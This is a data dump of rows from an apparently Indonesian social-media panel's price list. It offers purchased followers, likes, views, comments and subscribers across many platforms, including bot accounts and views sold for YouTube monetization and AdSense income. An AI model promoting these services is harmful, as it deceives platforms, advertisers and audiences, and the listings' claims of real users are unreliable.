(66, 26, 'Youtube Live Stream Views [ REAL ][ BETA ]', 'Tampilan Aktif Nyata **\n MULAI INSTAN\n 100% Pemirsa Pengguna YouTube Manusia Nyata!\n Tampilan Halaman Desktop Windows & Mobile Watch\n 100% Lalu Lintas Unik dapat dimonetisasi!\n Pemirsa Seluruh Dunia\n Harus Tidak Terbatas & Terbuka untuk SEMUA negara\n Retensi Acak\n Rata-rata Bersamaan dan waktu tonton berdasarkan konten streaming langsung\n Pengiriman Lebih Dijamin\n penayangan dapat dikirim ke embed video streaming langsung yang dinonaktifkan\n Sumber Lalu Lintas: Iklan Langsung\n\nCATATAN :\n- Layanan Beta - itu berarti layanan yang ditawarkan apa adanya tanpa jaminan isi ulang!\n- Tampilan dapat mencakup keterlibatan pengguna nyata - video Anda mungkin mendapatkan suka / tidak suka setiap hari, komentar, bagikan, pelanggan ,,, semua dibuat oleh pengguna YouTube nyata yang tidak kami kontrol!', 5000, 100000, 258400, 129200, 1, 1, 8439),
(67, 27, 'Twitter Retweets Server 1 [ Max 2K ]⚡️⚡️', '2k/days\nno refill', 20, 2000, 171000, 85500, 1, 1, 8440),
(68, 16, 'Instagram Likes MP 15 [ NO DROP ] Max terbanyak', 'No Drop Likes\n1-3K / Hour', 20, 50000, 36100, 18050, 1, 1, 8441),
(69, 9, 'Youtube Views server 10 [ LIFETIME ][ FASTEST IN THE MARKET ]', 'Speed 1 Million Per Day\nInstant Start\nNON-Drop\nLife Time Guarantee', 1000, 100000000, 91200, 45600, 1, 1, 8442),
(70, 20, 'TIK TOK Likes Server 1 [ 30 days refill  ] [ SuperInstant  ] ', '25K/Day\nGuarantee : 30 Days', 100, 30000, 53200, 26600, 1, 1, 8443),
(71, 28, 'Likee App Post Likes [Speed : 1k-2k/day]', 'contoh target :https://likee.com/@********/video/*********\nNo refill', 20, 10000, 201400, 100700, 1, 1, 8444),
(72, 28, 'Likee App Followers  [ 500-1k/day ]', 'contoh target https://likee.com/@********\nno refill', 20, 10000, 437000, 218500, 1, 1, 8445),
(73, 21, 'Youtube Like MP 7 [ No Refill and Cheapest ] ', 'Real Youtube Likes\nInstant Start', 30, 50000, 57000, 28500, 1, 1, 8446),
(74, 24, 'Instagram Followers Server 7 [ fastest - BOT ] ', 'Bot Quality', 10, 30000, 20900, 10450, 1, 1, 8447),
(75, 2, 'Telegram Channnel Members [ Max 50k ] Non Drop', 'Instant\nSpeed 5 day\nNon Drop\ntetap no garansi jika drop', 100, 50000, 60800, 30400, 1, 1, 8448),
(76, 2, 'Telegram Channnel Members [ Max 5k ] INSTANT-3HRS ', 'Speed:5k/day', 1000, 5000, 98800, 49400, 1, 1, 8449),
(77, 16, 'Instagram Likes MP 19 [ NON DROP ] [5k-10k Per Day] ', 'instan', 100, 300000, 45600, 22800, 1, 1, 8450),
(78, 29, 'Instagram Followers Refill S2 [ Refill 30Day ] LessDrop♻️', 'kemungkinan drop 5-15% ( tapi gk jami 100% )\nHigh-Quality\n', 50, 100000, 125400, 62700, 1, 1, 8451),
(79, 29, 'Instagram Followers Refill S3 [ Refill 30Day ] [ Real Recommended  ]', 'sekitar 70%-80% real user\nSpeed 1k Per Day\n', 100, 100000, 53200, 26600, 1, 1, 8452),
(80, 22, 'Facebook Profile Follower MP 4 [ R30Day ] [Non Drop]', 'Refill 30Day\nkami sudah uji selama 2 bulan dan tidak ada penurunan\njadi kami tidak bisa mastikan ini nondrop 100% jika ada update dll', 30, 100, 235600, 117800, 1, 1, 8453),
(81, 9, 'Youtube Views MP 1 [ 50k-100k/day ] [ 20 Days Refill ] INSTANT', 'Instant Start\n1-3mins Retention\n50k-100k/day\n20 Days Refill', 100, 100000000, 121600, 60800, 1, 1, 8454),
(82, 9, 'Youtube Views MP 6 [ 20-50k/days ] [ 30 Days Refil ] ', 'fast', 100, 100000000, 117800, 58900, 1, 1, 8455),
(83, 9, 'Youtube Views MP 7 [ Best Service ] [ Life Time Guaranteed ] ', 'INSTANT START\nGood For Ranking\nLife Time Guaranteed\nFast', 1000, 100000000, 85500, 42750, 1, 1, 8456),
(84, 16, 'Instagram Likes MP 20 [ Real Account ] [ Best Seller ] ', 'No garansi apaun yg terjadi\nKualitas bagus\ntidak drop paling kalo drop sekitar 10% ( kami tidak menjamin ini selamanya karna ig kadang update gk jelas )', 10, 20000, 26980, 13490, 1, 1, 8457),
(85, 30, 'Twitter Followers REAL INDONESIA Fast S2', 'No garansi\nno kompline\nReal indo\nUSERNAME/AKUN YANG DI SUBMIT TIDAK BISA DI SUBMIT ULANG\nhanya bisa 200 per akun!', 10, 100, 1368000, 684000, 1, 1, 8458),
(86, 30, 'Twitter Retweet REAL INDONESIA Fast', 'No garansi\nno kompline\nReal indo', 10, 100, 1026000, 513000, 1, 1, 8459),
(87, 30, 'Twitter Favorite/Likes REAL INDONESIA Fast', 'No garansi\nno kompline\nReal indo', 10, 300, 254600, 127300, 1, 1, 8460),
(88, 31, 'Youtube Views [ Jam Tayang 1000 jam ] [ Durasi Video 2 jam+ ] [ cek Deskripsi ] ', 'pesanan selesai dalam 3-10 hari\nwajib durasi 2jam lebih\n30 days Refill\nmNEDAPAT 1000 JAM', 1000, 1000, 855000, 427500, 1, 1, 8461),
(89, 23, 'Facebook Photo / Post Likes Indonesia', 'Instan', 50, 50, 121600, 60800, 1, 1, 8462),
(90, 23, 'Facebook Photo / Post Likes MP5 [ 30 days Refill ] [max 500]', 'Murah\ngk support live', 20, 500, 47880, 23940, 1, 1, 8463),
(91, 18, 'Instagram Likes + Reels  Indonesia MP 7 [ MAX 5K ] [ real aktif ] FAST MURAH [ Refill 14 days ]', 'Drop kecil banget\nreal \nRefill 14 days \nhanya bisa 1x refill\nsyaratnya\n- like dibawah start order/jumlah awal gak bisa refill.\n- user private gak bisa refill\n- orderan belum ada 24 jam belum bisa refill\n\nmax db 3000', 25, 1000, 57000, 28500, 1, 1, 8464),
(92, 29, 'Instagram Followers Refill S8 [ Refill 30D] [ max 5k ] HQ FAST', 'DROP KEMUNGKINAN Hanya 10%\nmulai 0-1jam', 10, 500000, 53200, 26600, 1, 1, 8465),
(93, 32, 'Instagram TV Like Server 4 [ BOT ] [ HQ ]', 'Instant\nno garansi', 10, 10000, 41800, 20900, 1, 1, 8466),
(94, 32, 'Instagram TV Like Server 5 [ Instan ]', 'instan', 100, 15000, 23940, 11970, 1, 1, 8467),
(95, 16, 'Instagram Likes MP 26 [ No drop ] Real ', 'High Quality\nNo drop, jika drop mungkin hanya 10% buat sekarang', 100, 15000, 45600, 22800, 1, 1, 8468),
(96, 16, 'Instagram Likes MP 27 [10K] cheap', 'no garansi\nspeed 300/jam\nmulai 0-2 jam', 10, 10000, 19760, 9880, 1, 1, 8469),
(97, 6, 'Twitter Views Server 3 [ FAST - Max 1M ] ', '100k-200k/hour', 100, 10000000, 7600, 3800, 1, 1, 8470),
(98, 29, 'Instagram Followers Refill S14 [ Auto Refill  30 Days ]', 'Auto Refill 30 days\n', 20, 10000, 87400, 43700, 1, 1, 8471),
(99, 33, 'Youtube Subscribe SERVER 3 Best Monetization ', '30 Days Refill\nSpeed:200-300/day\nHigh Quality subs - Helps for Monetization Approval\nMax 50k [ Can order 25 times - 2K ]', 10, 2000, 1463000, 731500, 1, 1, 8472),
(100, 16, 'Instagram Likes MP 29 [ Real ] cheapeast ', 'No garansi\nfast', 100, 5000, 26600, 13300, 1, 1, 8473),
(101, 21, 'Youtube Video Custom Comments MP 1 Cheapest ', 'Cheapest\nmulai proses 0-24jam', 10, 5000, 452200, 226100, 1, 1, 8474),
(102, 34, 'Instagram Followers Refill S15 [ Refill 99 Days ] ♻️', '1K-2K/day', 10, 500000, 101840, 50920, 1, 1, 8475),
(103, 35, 'Instagram 5 Comments random [ dari Akun dengan followers 10k + ]', 'instan\nmendapat 5 komentar', 1000, 1000, 121600, 60800, 1, 1, 8476),
(104, 35, 'Instagram Comments Costum [ dari Akun dengan followers 15k + ] [ Rp2.800 ]', 'Proses slow\nwaktu mulai 0-48jam', 1, 30, 10640000, 5320000, 1, 1, 8477),
(105, 35, 'Instagram Comments Costum [ dari Akun dengan followers 10k + ] [ Rp11.000 ] ', 'lebih fast dari id layanan 1837\n', 1, 10, 41800000, 20900000, 1, 1, 8478),
(106, 35, 'Instagram  Comments Custom [Account Verif/centang biru] [ Rp25.500 ] ', 'lambat\nnon drop', 1, 10, 96900000, 48450000, 1, 1, 8479),
(107, 35, 'Instagram  Comments Random [Account Verif/centang biru] [ Rp21.000 ] ', 'lambat\nnon drop', 1, 10, 79800000, 39900000, 1, 1, 8480),
(108, 35, 'Instagram 5 Comments random [ dari Akun dengan followers 1juta+ ] ', 'waktu mulai 0-24 jam\ndapat 5 komentar', 1000, 1000, 201400, 100700, 1, 1, 8481),
(109, 24, 'Instagram Followers S15 [ LESS DROP ] [ REAL ] ', '75% real\nno garansi', 20, 5000, 43700, 21850, 1, 1, 8482),
(110, 24, 'Instagram Followers S16 [ 10K ] [ REAL ] ', 'START TIME 0-1H\n5K/DAY\nno garansi', 20, 10000, 60800, 30400, 1, 1, 8483),
(111, 24, 'Instagram Followers Server 2 [ No Refill] [ BOT ] ', 'INSTANT\nkadang sukses pesanan tidak full masuj\nno kompline', 10, 10000, 17100, 8550, 1, 1, 8484),
(112, 33, 'Youtube Subscribe SERVER 6 [ 30 days guarantee ] 20/day', 'Speed - 20/day\n30 Days guarantee\nrefill only no reffund', 5, 2000, 1276800, 638400, 1, 1, 8485),
(113, 29, 'Instagram Followers Refill S16 [ Refill 30Days ] [ REAL HQ ]', 'instan\nwaktu mulai 0-6 jam\n', 10, 20000, 106400, 53200, 1, 1, 8486),
(114, 6, 'Twitter Impressions Server 2 [5M] ', 'fast', 100, 10000000, 16340, 8170, 1, 1, 8487),
(115, 6, 'Twitter Views Server 4 [ SUPERFAST - Max 100M ] ', '1Juta/hour', 100, 100000000, 4940, 2470, 1, 1, 8488),
(116, 20, 'TIK TOK Likes MP 2 [ HQ ] [ NON-DROP] ', 'NON-DROP & HQ\n1000/hours\nwaktu mulai 0-12 jam', 20, 5000, 182400, 91200, 1, 1, 8489),
(117, 36, 'TIKTOK Share MP 1 [ Real Share ] INSTANT', 'THE CHEAPEST SERVICE\nREAL PROFILE', 10, 100000, 95000, 47500, 1, 1, 8490),
(118, 34, 'Instagram Followers Refill S18 [ Refill 60Day ] INSTANT ', 'High Quality\n1k - 2k Per Day Speed\nLow Drop\n', 20, 100000, 121600, 60800, 1, 1, 8491),
(119, 33, 'Youtube Subscribe SERVER 7 Real USA', '30-50days \nguaranted 30days', 5, 1500, 1254000, 627000, 1, 1, 8492),
(120, 33, 'Youtube Subscribe SERVER 8 Best Monetization ', '30 Days Refill\nSpeed:200-300/day\nHigh Quality subs - Helps for Monetization Approval\nMax 50k [ Can order 25 times - 2K ]', 5, 2000, 1501000, 750500, 1, 1, 8493),
(121, 29, 'Instagram Followers Refill S21 [ AUTO refill 30D ][ HQ ]', '- High-Quality Instagram followers\n- Followers Unfollow 5%\n- Speed 2k-5k per days', 10, 5000, 64600, 32300, 1, 1, 8494),
(122, 37, 'Youtube Subscribe SERVER 12 [ No Refill ]', 'No garansi\nTIDAK ADA KOMPLINAN APAPUN\nMAU TIDAK MASUK ATAU DROP LANGSUNG\nLAYANAN NO GARANSI!', 100, 20000, 33820, 16910, 1, 1, 8495),
(123, 25, 'TIK TOK View S13 [ WORK AFTER UPDATE ] INSTAN', 'Fast\nmin 100', 100, 1000000, 3040, 1520, 1, 1, 8496),
(124, 15, 'Shopee Followers Indonesia  [ Max 50K] NON DROP', 'Masukkan username shopee\nbisa order 2x 25k jadi 50k', 100, 25000, 68400, 34200, 1, 1, 8497),
(125, 29, 'Instagram Followers Refill S22 [ AUTO refill 30D ]⭐⭐', '30 days guarantee\nauto refill\n1-3k/day', 10, 100000, 49400, 24700, 1, 1, 8498),
(126, 35, 'Instagram Custom Comments Indonesia Instan 2', 'fast', 5, 500, 2356000, 1178000, 1, 1, 8499),
(127, 16, 'Instagram Likes MP 31  [ Refill 30D ] INSTANT', 'Refill 30D\nSpeed 2k/day', 50, 10000, 7600, 3800, 1, 1, 8500),
(128, 33, 'Youtube Subscribe SERVER 10 [ NON DROP ] [30d guaranted]♻️', '30d guaranted', 100, 50000, 874000, 437000, 1, 1, 8501),
(129, 38, 'Instagram Followers Refill S23 [ refill button 180D ]♻️', 'proses refill 2-3hari\n', 100, 500000, 26600, 13300, 1, 1, 8502),
(130, 29, 'Instagram Followers Refill S25 [ NON DROP ] real followers ♻️', 'NON-drop\n30 days refill\nKualitas Bagus', 1000, 100000, 95000, 47500, 1, 1, 8503),
(131, 29, 'Instagram Followers Refill S25 [ AUTO REFILL 30Days ] HQ', 'hanya bisa refill jika yg turun dari kami\nAuto Refill\nInstan', 20, 100000, 47500, 23750, 1, 1, 8504),
(132, 9, 'Youtube Views MP 24 [ Non Drop ] Lifetime ', '- Instant Start\n- Speed 10k - 20k /day For NOW\n- NON DROP', 100, 100000000, 106020, 53010, 1, 1, 8505),
(133, 29, 'Instagram Followers Refill S26 [ AUTO REFILL 30Days ] MAX 30k', 'Instant\n30 days auto refill\nSpeed 5k/D', 50, 30000, 45600, 22800, 1, 1, 8506),
(134, 2, 'Telegram Post Views [500K] [Last 1 Post] ', 'Last 1 Post', 100, 500000, 2090, 1045, 1, 1, 8507),
(135, 2, 'Telegram Post Views [500K] [Last 10 Post] ', 'Last 10 Post', 50, 500000, 6840, 3420, 1, 1, 8508),
(136, 16, 'Instagram Likes MP 32 cheapeast world [ NO DROP ] FAST', 'Instant\nno drop\nTapi Jika drop gk ada reffund', 100, 50000, 6080, 3040, 1, 1, 8509),
(137, 6, 'Twitter Views Server 5 [ Cheap - Max 100k ] ', 'No REFILL\n100k/hour', 100, 150000, 3800, 1900, 1, 1, 8510),
(138, 2, 'Telegram - Channnel Members/Group Server 4 [ Max 15K] R10Days', 'Mulai: 1-30 Menit\nKecepatan: 5000 / hari\nRefill 10Days\nKualitas: Real\nJika Anda Telah Mengubah Tautan Atau Saluran Dihapus Tidak Akan Ada Pembatalan Pesanan', 500, 15000, 95000, 47500, 1, 1, 8511),
(139, 9, 'Youtube Views MP 25 [ Lifetime ] No Drop [ Best ]', 'working service\n10k-20k/day speed\n100% non-drop', 500, 10000000, 102600, 51300, 1, 1, 8512),
(140, 24, 'Instagram Followers Server 7 [ Real ] [ Fast ] Recomended', 'Real\nInstan', 50, 20000, 29260, 14630, 1, 1, 8513),
(141, 39, 'Clubhouse Followers 100 User', 'mulai : 0-6 jam\nKecepatan : 0-12 jam\norder 1000 mendapatkan 100 user', 1000, 1000, 418000, 209000, 1, 1, 8514),
(142, 39, 'Clubhouse Followers 250 User', 'mulai : 0-6 jam\nKecepatan : 0-12 jam\norder 1000 mendapatkan 250 user', 1000, 1000, 1026000, 513000, 1, 1, 8515),
(143, 39, 'Clubhouse Followers 500 User ', 'mulai : 0-6 jam\nKecepatan : 0-12 jam\norder 1000 mendapatkan 500 user', 1000, 1000, 1824000, 912000, 1, 1, 8516),
(144, 34, 'Instagram Followers Refill S27 [ REFILL 90Days ] Nodrop♻️', 'High quality followers\nDrop Sekitar: 2-3%\nKecepatan 20-30K/day', 100, 500000, 55100, 27550, 1, 1, 8517),
(145, 15, 'Tokopedia Feeds likes', '1', 50, 2000, 30400, 15200, 1, 1, 8518),
(146, 40, 'TikTok Followers Indonesia BONUS++', 'indo pasif\nproses 3x24 jam\ndapat bonus jika beruntung\nmax db 200', 100, 100, 323000, 161500, 1, 1, 8519),
(147, 4, 'Instagram Live Video Views Likes and Comments also', 'refund related issue.\n1286 Instagram Live Video Views - Max 30k - Likes and Comments also 12.00 20 30000 3 hours and 27 minutes Starts within 1-2 mints after ordering\nstart live and then order\nHas random likes and comments\nmin 20 max 20k\nif have problem please share screenshot with time and no. of viewers.\n\nAvg Retention of viewers - 30 to 60 minutes', 20, 30000, 836000, 418000, 1, 1, 8520),
(148, 33, 'Youtube Subscribe SERVER 7 [ 30 days refill ][ 100% real ] ', '20+/day\nNO stuck\nNO drop\nStart Time: 0-1hrs', 20, 55000, 1482000, 741000, 1, 1, 8521),
(149, 2, 'Telegram - Channnel Members/Group Server 5 [ Max 5M] REAL FAST', 'NO REFILL\nLink: Https://T.Me/Username\nStart: 1-30 menit\nSpeed: 50000/Hari\nJika Anda Telah Mengubah Tautan Atau Saluran Dihapus Tidak Akan Ada canceled Pesanan', 50, 5000000, 77140, 38570, 1, 1, 8522),
(150, 2, 'Telegram - Channnel Members/Group Server 6 [ Max 10K] REAL INDIA ', 'Link: Https://T.Me/Username\nStart: 0-360 Min\nSpeed: 5000/D\nRefill: 30 Days\nQuality: INDIAN\nJika Anda Telah Mengubah Tautan Atau Saluran Dihapus Tidak Akan Ada canceled Pesanan', 10, 10000, 91200, 45600, 1, 1, 8523),
(151, 29, 'Instagram Followers Refill S29 [ Refill 30 Days ] cheapeast ', '- Guarantee: 30 days Refill\n- Instant Start\n- Refill button', 50, 10000, 32300, 16150, 1, 1, 8524),
(152, 24, 'Instagram Followers Server 9 [ No Refill ] [ Fast ] BOT ', 'waktu mulai 0-6 jam', 50, 10000, 13680, 6840, 1, 1, 8525),
(153, 29, 'Instagram Followers Refill S30 [ Refill 45D ] less - no drop', 'fast\nkemungkinan 0-10% drop\nkualitas bagus', 20, 200000, 72200, 36100, 1, 1, 8526),
(154, 41, 'Instagram Reels Likes S1 [ Max - 20k ] INSTANT', 'INSTANT', 20, 20000, 20900, 10450, 1, 1, 8527),
(155, 41, 'Instagram Reels Likes S2 [ Max - 10k ] FAST', 'fast', 10, 10000, 45600, 22800, 1, 1, 8528),
(156, 16, 'Instagram Likes Server 9 [ Real ] [ NO DROP ] ', 'No drop ( kemungkinan, drop hanya 10% )\ntetap no garansi', 100, 5000, 8930, 4465, 1, 1, 8529),
(157, 40, 'TikTok Likes Indonesia ', 'Proses max 3x24jam\nMAX DB 200', 100, 200, 174800, 87400, 1, 1, 8530),
(158, 24, 'Instagram Followers Server 10 [ No Refill ] [ Fast ] BOT CHEAP', 'fast', 10, 10000, 12122, 6061, 1, 1, 8531),
(159, 29, 'Instagram Followers Refill S31 [ Refill button 10D ] 3k/days ♻️', 'HQ\nwaktu mulai 0-24 jam', 50, 10000, 25080, 12540, 1, 1, 8532),
(160, 34, 'Instagram Followers Refill S32 [ Refill 99days ] FAST HQ', 'Drop sekitar 0-10%\nkualitas bagus\nNON DROP\nrefill 99 days', 20, 200000, 38000, 19000, 1, 1, 8533),
(161, 42, 'Twitter Followers Server 10 [ No refill ] ', '- Start 0-1 hour\n- Speed up to 400 / day (The average speed per day is 50-400!)', 50, 1000, 448400, 224200, 1, 1, 8534),
(162, 24, 'Instagram Followers Server 11 [ No Refill ] [ mix real ] ', 'drop kemungkinan 10-20% untuk saat ini\nprofil ada story nya', 20, 10000, 18050, 9025, 1, 1, 8535),
(163, 12, 'Youtube Short Likes Server 1 [ refill 30 days ]', 'fast\nno drop\ngaransi refill 30 days', 10, 100000, 96900, 48450, 1, 1, 8536),
(164, 9, 'Youtube Views Spesial [ 60days Guaranted ] BONUS Likes', 'Instant start\nwaktu mulai 0-6jam\nkecepatan 7k-15k/days', 100, 5000000, 45600, 22800, 1, 1, 8537),
(165, 43, 'Youtube views untuk penambah Adsense 1 ( 2 - 4$ )', '- Durasi Video : Harus 5 menit+\n- Pendapatan bergantung pada berbagai faktor seperti kata kunci, panjang, topik, dan lokasi, dll.\n- Kami Tidak Menjamin Berapa Banyak Pendapatan yang Akan Anda Dapatkan? (tetapi $ 2 - 4 diperkirakan untuk 1000 view)\n- Garansi: kami hanya akan isi ulang view bukan pendapatan anda!\ngaransi 30 hari\n\nNOTE: kami tidak menjamin untuk pendapatan akan dapat terus, Kami hanya menggaransikan view\nlebih baik untuk mencoba pesan 100 saja dlu untuk mencobanya', 100, 10000, 174800, 87400, 1, 1, 8538),
(166, 33, 'Youtube Subscribe VIP 2 [ 30Days refill ][ REAL ] 500/days NON DROP ', '- Guarantee: 30 days\n- Speed : 500 - 2000+/D\n- 100 % real user\n- Almost NON DROP\n- jumlah subs harus di publik!\n- Use channel link or video link to order .\n- Channel harus mempunyai minimal 1 video', 100, 100000, 1672000, 836000, 1, 1, 8539),
(167, 33, 'Youtube Subscribe VIP 3 [ 30Days autorefill ][ REAL ] BEST SELLER', 'No stuck\nReal Subs\nBig orders more speed\n30D refill---- 2-3% drop auto refill in every 24hrs', 10, 50000, 1634000, 817000, 1, 1, 8540),
(168, 12, 'Youtube Short Views Server 2 [No refill ] ', 'Instant Start\n5k-20k/day\nNo Refill', 100, 100000000, 43700, 21850, 1, 1, 8541),
(169, 12, 'Youtube Short Likes Server 2 [ refill 30 days ] cheap', 'Instant Start\n30 Days Refill\nSuperfast\n20k-40k per day!', 10, 100000, 70300, 35150, 1, 1, 8542),
(170, 12, 'Youtube Short Likes Server 3 [ no refill ] cheap ', 'Instant Start\nSuperfast\nNo Refill\n10k-20k per day!', 20, 50000, 47500, 23750, 1, 1, 8543),
(171, 12, 'Youtube Short Likes Server 4 [ Life Time Guaranteed ] cheap ', 'FAST', 20, 200000, 134900, 67450, 1, 1, 8544),
(172, 16, 'Instagram Likes Server 10 [ mix ] [ Superfast, 30 days refill ]', '30 days refill', 50, 15000, 5700, 2850, 1, 1, 8545),
(173, 26, 'Youtube Live Stream Views [ Min 1k - unlimited ] cheap ', 'Waktu mulai = Instan - 5 menit\njika Anda pesan 1000, Anda akan mendapatkan 1000 view dalam kelipatan 200-300 [ Live mungkin akan mendapatkan 200-300 like, dan menyelesaikan 1000 view]\n\nTidak ada reffund, tidak ada kompline\norder = berani naggung resiko', 1000, 10000000, 74100, 37050, 1, 1, 8546),
(174, 9, 'Youtube Views Server 5 [ 10K/Day ]  Lifetime Guarantee  [ Recommended#1]', 'Lifetime Guarantee\n5-10k/day', 100, 10000000, 47500, 23750, 1, 1, 8547),
(175, 24, 'Instagram Followers Server 13 [ cheap ] ', 'INSTANT START\nBOT PROFILE\nBIG DROPS\nNO REFILL', 10, 15000, 9158, 4579, 1, 1, 8548),
(176, 26, 'Youtube Live Stream Views stay 24jam', '- Order 1000 views kamu dapat 100 - 300 live views stay di live mu 24jam\n- Order 2000 views kamu dapat 200 - 600 live views stay di live mu 24jam\n- Order 3000 views kamu dapat 300 - 900 live views stay di live mu 24jam\n\nCatatan :\n- Harap teruskan siaran langsungmu, Jangan segera mengakhiri siaran langsung. Jika video dihapus atau segera berakhir maka kami tidak dapat reffund/cancel.\n- Setelah order, tidak ada reffund.\n- tidak bisa cancel apapun itu alasannya\n- tidak ada refund apapun itu alasannya\norder = ambil resiko', 1000, 3000, 235600, 117800, 1, 1, 8549),
(177, 22, 'Facebook Follower Profile indonesia MP 8 [ max 50 ] ', 'waktu proses 0-7 jam', 50, 50, 209000, 104500, 1, 1, 8550),
(178, 22, 'Facebook Follower Profile MP 9 [ real ] [ Refill 30 Days ]', 'waktu mulai 0-12 jam', 1000, 100000, 125400, 62700, 1, 1, 8551),
(179, 17, 'Instagram Followers Indonesia S12 [ REAL AKTIF ][ 2K ] Refill 7 days ', 'proses 1x24 jam\nreal aktif\n\nRefill 7 days \nhanya bisa 2x refill tapi ada cooldown 2 hari\nsyaratnya\n- foll dibawah start order/jumlah awal gak bisa refill.\n- user private gak bisa refill\n- orderan belum ada 24 jam belum bisa refill', 100, 1000, 152000, 76000, 1, 1, 8552),
(180, 29, 'Instagram Followers Refill S35 [ refill 7days ]  cheap ', 'Instant start\ntidak ada reffund\nhanya refill jika drop\njangan berharap lebih sama layanan murah', 10, 30000, 17100, 8550, 1, 1, 8553),
(181, 29, 'Instagram Followers Refill S36 [ refill 30days ] [ cheap & less drop ] ♻️', '0-10% drop\nReal Mixed\nSpeed 10Kday', 50, 200000, 28120, 14060, 1, 1, 8554),
(182, 24, 'Instagram Followers Server 16 [ NEW ] [ no refill ] ', 'waktu proses 0-12 jam\n', 100, 10000, 17480, 8740, 1, 1, 8555),
(183, 44, 'Instagram  Followers [1 Follower] VERIFIED/CENTANG BIRU', 'mendapatkan 1 followers yang verified/centang biru\nproses bisa 3-7 hari\nbahkan mungkin bisa sebulan\ntolong bersabar', 1000, 1000, 57000, 28500, 1, 1, 8556),
(184, 44, 'Instagram Followers [2 Follower] VERIFIED/CENTANG BIRU ', 'mendapatkan 2 followers yang verified/centang biru\nproses bisa 3-7 hari\nbahkan mungkin bisa sebulan\ntolong bersabar', 1000, 1000, 108300, 54150, 1, 1, 8557),
(185, 44, 'Instagram Likes VERIFIED/CENTANG BIRU DONE 24 JAM [Rp 13.000 1like ]', 'Jika tidak selesai dalam 1-3 hari\nlangsung bikin tiket', 1, 13, 49400000, 24700000, 1, 1, 8558),
(186, 44, 'Instagram Comments [CUSTOM] VERIFIED/CENTANG BIRU DONE 24 JAM [Rp 22.000 1 Comments  ]', 'jika dalam seminggu belum masuk\nsilahkan ke tiket', 1, 13, 83600000, 41800000, 1, 1, 8559),
(187, 24, 'Instagram Followers Server 17 [ NEW ] [ no refill BOT ] ', 'NO Refill', 100, 10000, 15960, 7980, 1, 1, 8560),
(188, 29, 'Instagram Followers Refill S37 [ refill 30days ] [ cheap ] ', '0 - 10 mins', 10, 50000, 28500, 14250, 1, 1, 8561),
(189, 21, 'Youtube Like MP 10 Cheapest [ No refill ] ', 'Best Price\nNO REFILL\nno garansi', 50, 50000, 33820, 16910, 1, 1, 8562),
(190, 10, 'instagram view UPDATE 1 [ Bisa untuk REEL/IGTV/VIDEO ]', 'Emergency\n50k/hour', 100, 5000000, 28120, 14060, 1, 1, 8563),
(191, 9, 'Youtube Views JUMBO 1 [ 30 days  AUTO REFILL ] FAST 250k/day BONUS LIKE+++', 'Layanan super cepat\nSebagian besar DISARANKAN dan EKSTERNAL\nDrop: jika drop dari view berlebih tidak ada refill\n\nTIDAK ADA PENGEMBALIAN DANA ATAU ISI ULANG UNTUK JUMLAH PENGIRIMAN TAMBAHAN', 15000, 10000000, 62700, 31350, 1, 1, 8564),
(192, 37, 'Youtube Subscribe SERVER 13 [ NO refill ]', 'TIDAK ADA KOMPLINE SAMA SEKALI\ndalam kasus apapun\nORDER = BERANI AMBIL RESIKO\nInstant - 1 hours\n1k-10k/day\nbisa drop dalam hitungan jam', 100, 10000, 66500, 33250, 1, 1, 8565),
(193, 10, 'instagram view UPDATE 3 [ WORKS ON REEL AND IGTV ] DARURAT Cheap ', '0-1H\nREAL\n100M', 50, 100000000, 1710, 855, 1, 1, 8566),
(194, 26, 'Youtube View Premiere Waiting Server 1 [ cek note ]', '0-5 Minutes Starting time\n250-300 Viewers per 1000 Order\nNo Refill\nWatchtime - 30 minute to 90 Minute', 1000, 1000000, 133000, 66500, 1, 1, 8567),
(195, 26, 'Youtube View Premiere Waiting Server 3 [ cek note ] Automated Passive Views', '- Automated Passive Views - Pre-Premiere Waiting Viewers\n- You will get 5000 Unique Automated Passive Waiting Pre-Premiere Viewers that will stay and wait for 1 Hour!\n- INSTANT Start\n- Windows Desktop & Mobile Watch Page Waiting Viewers\n- World-Wide Viewers\n- Avg Concurrent waiting on Pre-Premiere content 500-1000+ waiting viewers\n- Great for Ranking!\n- Video Must be Unrestricted & Open for ALL countries\n\nNOTE : Service offered as-is with no refill/refund guarantee!\n** note that the Pre-Premiere Waiting viewers will NOT turn into viewers if the premiere/live broadcast will start during the campaign time-frame. (those waiting viewers will not be registered as Livestream viewers or as YouTube views or anywhere on the YouTube studio analytics!)', 5000, 5000, 72200, 36100, 1, 1, 8568),
(196, 42, 'Twitter Followers Server 12 [ 30 days refill ] USA', 'Start Time: 1 Hour\nREAL\nusername', 20, 10000, 570000, 285000, 1, 1, 8569),
(197, 45, 'Instagram Like Komentar FAST Server 3 [ baca deskripsi ]', 'untuk order di web \ntarget masukin link poto\nLink Post masukin username\n\nuntuk order Via API\nparameter target masukin link poto\nparameter custom_link masukin username\n\nwaktu mulai 0-2 jam\nNo Refill', 20, 10000, 79800, 39900, 1, 1, 8570),
(198, 24, 'Instagram Followers Server 18 [ no refill BOT ] INSTANT', 'Tidak ada kompline apapun\nINSTANT START\nBOT PROFILE\nBIG DROPS\nNO REFILL', 10, 1000, 4560, 2280, 1, 1, 8571),
(199, 26, 'Youtube Live Stream Views stay 30 menit', 'order = berani ambil resiko\ntidak ada alasan reffund apapun itu\ntidak bisa canceled\njangan order jika tidak mau jadi hal tidak dinginkan!\n- Start time : 0 - 10 mins\n- Traffic source : Almost suggested views\n- 10% viewers will stay and stay in 30 mins\n- Natural , real .', 500, 3000, 10260, 5130, 1, 1, 8572),
(200, 26, 'Youtube Live Stream Views stay 60 menit', 'order = berani ambil resiko\ntidak ada alasan reffund apapun itu\ntidak bisa canceled\njangan order jika tidak mau jadi hal tidak dinginkan!\n- Start time : 0 - 10 mins\n- Traffic source : Almost suggested views\n- 10% viewers will stay and stay in 60 mins\n- Natural , real .', 500, 3000, 14820, 7410, 1, 1, 8573),
(201, 26, 'Youtube Live Stream Views stay 120 menit ', 'order = berani ambil resiko\ntidak ada alasan reffund apapun itu\ntidak bisa canceled\njangan order jika tidak mau jadi hal tidak dinginkan!\n- Start time : 0 - 10 mins\n- Traffic source : Almost suggested views\n- 10% viewers will stay and stay in 120 mins\n- Natural , real .', 500, 3000, 30020, 15010, 1, 1, 8574),
(202, 26, 'Youtube Live Stream Views stay 12 jam', 'order = berani ambil resiko\ntidak ada alasan reffund apapun itu\ntidak bisa canceled\njangan order jika tidak mau jadi hal tidak dinginkan!\n- Start time : 0 - 10 mins\n- Traffic source : Almost suggested views\n- 10% viewers will stay and stay in 12h\n- Natural , real .', 500, 3000, 69540, 34770, 1, 1, 8575),
